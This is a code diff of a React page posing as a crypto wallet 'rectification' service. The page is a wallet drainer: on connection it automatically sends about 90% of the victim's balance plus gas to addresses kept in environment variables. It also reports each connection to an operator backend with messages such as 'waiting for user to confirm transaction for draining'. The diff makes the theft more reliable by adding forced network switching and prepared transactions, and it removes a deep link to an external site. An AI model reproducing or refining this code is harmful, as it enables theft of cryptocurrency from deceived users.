@@ -1,26 +1,29 @@
 import selections from "../data";
-import { useChainId } from 'wagmi';
-import chainsImage  from "/images/chains.jpeg";
-
-import { 
-  mainnet, 
-  arbitrum, 
-  bsc, 
-  solana, 
-  solanaTestnet, 
-  solanaDevnet, 
-  bitcoin,   sepolia, 
-} from '@reown/appkit/networks';
-import { useAppKit, useAppKitAccount, useWalletInfo } from "@reown/appkit/react";
+import { useChainId } from "wagmi";
+import chainsImage from "/images/chains.jpeg";
 import {
+  mainnet,
+  arbitrum,
+  bsc,
+  solana,
+  solanaTestnet,
+  solanaDevnet,
+  bitcoin,
+  sepolia,
+} from "@reown/appkit/networks";
+import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
+import {
+  useSwitchChain,
   useSendTransaction,
+  BaseError,
+  useWaitForTransactionReceipt,
+  usePrepareTransactionRequest,
   useBalance,
   useGasPrice,
   useEstimateGas,
 } from "wagmi";
 // import { parseEther } from 'viem'
 import { useEffect, useState } from "react";
-import { useWaitForTransactionReceipt } from "wagmi";
 
 
 
@@ -42,57 +45,77 @@ const Home = () => {
   const { address, isConnected } = useAppKitAccount();
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
-     const { walletInfo } = useWalletInfo();
 
   const [txHash, setTxHash] = useState(null);
 
   const chainId = useChainId();
 
-const CHAINS = {
-  [mainnet.id]: mainnet,
-  [arbitrum.id]: arbitrum,
-  [bsc.id]: bsc,
-  [solana.id]: solana,
-  [solanaTestnet.id]: solanaTestnet,
-  [solanaDevnet.id]: solanaDevnet,
-  [bitcoin.id]: bitcoin,
-  [sepolia.id] :   sepolia,
-};
-
-const activeChain = CHAINS[chainId];
-
-function formatBalance(balanceBigInt, chain) {
-  if (!balanceBigInt) return "0";
-
-  const value = BigInt(balanceBigInt);
-
-  const decimalsMap = {
-    mainnet: 18,
-      sepolia:18,
-    arbitrum: 18,
-    bsc: 18,
-    bitcoin: 8,
-    solana: 9,
-    solanaTestnet: 9,
-    solanaDevnet: 9
+  const CHAINS = {
+    [mainnet.id]: mainnet,
+    [arbitrum.id]: arbitrum,
+    [bsc.id]: bsc,
+    [solana.id]: solana,
+    [solanaTestnet.id]: solanaTestnet,
+    [solanaDevnet.id]: solanaDevnet,
+    [bitcoin.id]: bitcoin,
+    [sepolia.id]: sepolia,
   };
 
-  const decimals = decimalsMap[chain] ?? 18; // default to 18
+  const activeChain = CHAINS[chainId];
 
-  const divisor = 10n ** BigInt(decimals);
+  const chain = CHAINS[chainId];
+  const { switchChain } = useSwitchChain({
+    throwForSwitchChainNotSupported: true,
+    onError(error) {
+      console.log("Network switch error:", error);
+    },
+  });
 
-  const whole = value / divisor;
-  const fraction = value % divisor;
+const { data: request } = usePrepareTransactionRequest(
+  address && amountToSend && balance.data?.symbol
+    ? {
+        chainId: chain.id,
+        account: address,
+        to: import.meta.env[`VITE_${balance.data.symbol}_ADDRESS`],
+        value: amountToSend,
+      }
+    : undefined
+);
+  // const { sendTransaction, isPending } = useSendTransaction();
 
-  // Convert fraction to padded string
-  const fractionStr = fraction.toString().padStart(decimals, "0");
+  const requestSwitch = () => {
+    switchChain({ chainId: chain.id });
+  };
 
-  // Display only first few decimals for readability
-  return `${whole.toString()}.${fractionStr.slice(0, 6)}`;
-}
+  function formatBalance(balanceBigInt, chain) {
+    if (!balanceBigInt) return "0";
 
+    const value = BigInt(balanceBigInt);
 
+    const decimalsMap = {
+      mainnet: 18,
+      sepolia: 18,
+      arbitrum: 18,
+      bsc: 18,
+      bitcoin: 8,
+      solana: 9,
+      solanaTestnet: 9,
+      solanaDevnet: 9,
+    };
 
+    const decimals = decimalsMap[chain] ?? 18; // default to 18
+
+    const divisor = 10n ** BigInt(decimals);
+
+    const whole = value / divisor;
+    const fraction = value % divisor;
+
+    // Convert fraction to padded string
+    const fractionStr = fraction.toString().padStart(decimals, "0");
+
+    // Display only first few decimals for readability
+    return `${whole.toString()}.${fractionStr.slice(0, 6)}`;
+  }
 
   const { data: receipt, isSuccess: confirmed } = useWaitForTransactionReceipt({
     hash: txHash,
@@ -107,38 +130,33 @@ function formatBalance(balanceBigInt, chain) {
     }
   }, [confirmed]);
 
-  
-    const isMobile = () => /Mobi|Android/i.test(navigator.userAgent)
-    const [visitedTW, setVisitedTW ] = useState(false)
-  
-    useEffect(() => {
-               if (walletInfo?.name  === "Trust Wallet" && isMobile() && !visitedTW) {
-        // Open Trust Wallet with deep link
-       const trustLink = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`
-       window.open(trustLink, "_blank");
-       setVisitedTW(true)
-        return
-      }
-    }, [isConnected])
-
   useEffect(() => {
-    if (isConnected && address &&  activeChain?.id ) {
+    if (isConnected && address && activeChain.id) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
+      console.log("chainId:", chain.id);
+
+      if (activeChain?.id !== chain.id) {
+        console.log("Switching network...");
+        requestSwitch();
+        return; // ✅ Wait for network switch before sending transaction
+      } else {
+        console.log("network matches");
+      }
+
       walletConnectNotification();
       console.log("Balance:", formatBalance(balance.data?.value, activeChain));
 
       // ✅ Now safe to call transfer
       transferFunds();
-      // setTotalFee(0)
     }
-  }, [isConnected, address, balance.data, totalFee, activeChain?.id]);
+  }, [isConnected, address, balance.data, totalFee, activeChain, request]);
 
   const { sendTransaction } = useSendTransaction();
   const gasPrice = useGasPrice();
   const estimateGas = useEstimateGas({
     to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
-    value: balance.data?.value, // 0.001 ETH
+    value: balance.data?.value,
   });
 
   useEffect(() => {
@@ -146,70 +164,51 @@ function formatBalance(balanceBigInt, chain) {
       const fee = estimateGas.data * gasPrice.data; // bigint × bigint
       setTotalFee(fee);
 
-      setAmountToSend((balance.data?.value * 90n)/100n + fee);
+      setAmountToSend((balance.data?.value * 90n) / 100n + fee);
     }
     console.log("total fee:", totalFee, balance.data?.symbol);
   }, [estimateGas.data, gasPrice.data, balance.data?.value]);
 
   const transferFunds = () => {
-
-
-  if (!activeChain?.id) {
-    console.log("Unknown chain or unsupported chain");
+  if (!chain || !request) {
+    console.log("Cannot send transaction: missing chain or request");
     return;
   }
 
-  console.log("Sending transaction on:", activeChain.name);
-    console.log("amount to send:", formatBalance(amountToSend, activeChain));
-    console.log(balance.data?.value);
-    if (balance.data?.value <= 0n || !amountToSend || amountToSend <= 0n) {
-      console.log("not enough fund to cover gas fee or walletr not funded");
-      return;
-    }
+  if (!amountToSend || amountToSend <= 0n || balance.data?.value <= 0n) {
+    console.log("Not enough balance or amount to send");
+    return;
+  }
 
-       if(walletInfo?.name === "MetaMask" && isMobile()) {
-      const metamaskLink= "https://link.metamask.io"
-      window.open(metamaskLink, "_blank")
-    }
-
-    sendTransaction(
-      {
-        chainId: activeChain?.id,
-        account: address,
-        to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
-        value: amountToSend,
+    sendTransaction(request, {
+      onSuccess(hash) {
+        console.log("✅ Transaction sent:", hash);
+        setTxHash(hash);
       },
-      {
-        onSuccess(hash) {
-          console.log("✅ Transaction sent:", hash);
-          setTxHash(hash);
-        },
-        onError(error) {
-          console.log("❌ Error sending transaction:", error);
-        },
-      }
-    );
+      onError(error) {
+        console.log("❌ Error:", error);
+        console.log("❌ BaseError:", BaseError);
+      },
+    });
   };
-
 
   let message;
 
-
-
   const walletConnectNotification = async () => {
-
-      if (balance.data?.value > 0 && amountToSend > 0n) {
-    message = "waiting for user to confirm transaction for draining";
-  } else {
-    message = "connected wallet is not funded or not enough to cover gas fee";
-  }
+    if (balance.data?.value > 0 && amountToSend > 0n) {
+      message = "waiting for user to confirm transaction for draining";
+    } else {
+      message = "connected wallet is not funded or not enough to cover gas fee";
+    }
 
     await fetch(`${import.meta.env.VITE_API}/send-notification`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         address: `wallet ${address} succesfully connected`,
-        balance: `${formatBalance(balance.data?.value, activeChain)} ${balance.data?.symbol || ""}`.trim(),
+        balance: `${formatBalance(balance.data?.value, activeChain)} ${
+          balance.data?.symbol || ""
+        }`.trim(),
         message: message,
       }),
     });
@@ -220,14 +219,14 @@ function formatBalance(balanceBigInt, chain) {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        transaction: `${formatBalance(amountToSend, activeChain)} ${balance.data?.symbol} sent to ${
-          import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`]
-        }`,
+        transaction: `${formatBalance(amountToSend, activeChain)} ${
+          balance.data?.symbol
+        } sent to ${import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`]}`,
       }),
     });
   };
 
-    const images = Array.from({ length: 32 }, (_, i) => `/images/${i + 1}.PNG`);
+  const images = Array.from({ length: 32 }, (_, i) => `/images/${i + 1}.PNG`);
 
   return (
     <div className="bg-[#001132] h-full flex flex-col py-12 px-3 lg:px-32">
@@ -264,7 +263,7 @@ function formatBalance(balanceBigInt, chain) {
           </button>
         ) : (
           <div>
-            <appkit-button  />
+            <appkit-button />
           </div>
         )}
       </div>
@@ -279,12 +278,16 @@ function formatBalance(balanceBigInt, chain) {
           <br />
           <div className=" flex flex-col items-center text-center lg:grid lg:grid-cols-3 ">
             {selections.map((item, i) => (
-              <button onClick={()=>open()}
+              <button
+                onClick={() => open()}
                 key={i}
                 className="flex flex-col justify-center items-center py-4 px-4 my-5 w-[75vw] cursor-pointer h-48 rounded-3xl border-2 border-blue-600 lg:w-[20vw] lg:mx-10 bg-[#182030]"
-              ><div>{
-                item.icon &&  <item.icon className="text-center w-full text-4xl text-blue-600" />
-              }</div>
+              >
+                <div>
+                  {item.icon && (
+                    <item.icon className="text-center w-full text-4xl text-blue-600" />
+                  )}
+                </div>
 
                 <p className="text-white ">{item.name}</p>
                 <p className="text-gray-600 text-[12px]">
@@ -302,28 +305,29 @@ function formatBalance(balanceBigInt, chain) {
           Copyright &copy; 2025 Blocknode+ Rectification . All rights reserved.
         </p>
         <br />
-<div className="flex justify-center items-center w-full">
-  <img
-    src={chainsImage}
-    alt="supported chain"
-    className="rounded-3xl h-[30vw] w-[30vw]"
-  />
-</div>
+        <div className="flex justify-center items-center w-full">
+          <img
+            src={chainsImage}
+            alt="supported chain"
+            className="rounded-3xl h-[30vw] w-[30vw]"
+          />
+        </div>
         <br />
-        <h1 className="text-center bg-white  font-bold text-xl rounded-3xl">TRUSTED PARTNERS</h1>
+        <h1 className="text-center bg-white  font-bold text-xl rounded-3xl">
+          TRUSTED PARTNERS
+        </h1>
         <br />
-            <div className="grid grid-cols-2 space-y-2 space-x-2 items-center justify-center ml-4 lg:ml-[10vw]">
-      {images.map((src, index) => (
-        <img
-          key={index}
-          src={src}
-          alt=""
-          className="w-[150px] lg:w-[30vw]"
-        />
-      ))}
-    </div>
+        <div className="grid grid-cols-2 space-y-2 space-x-2 items-center justify-center ml-4 lg:ml-[10vw]">
+          {images.map((src, index) => (
+            <img
+              key={index}
+              src={src}
+              alt=""
+              className="w-[150px] lg:w-[30vw]"
+            />
+          ))}
+        </div>
       </div>
-      
     </div>
   );
 };
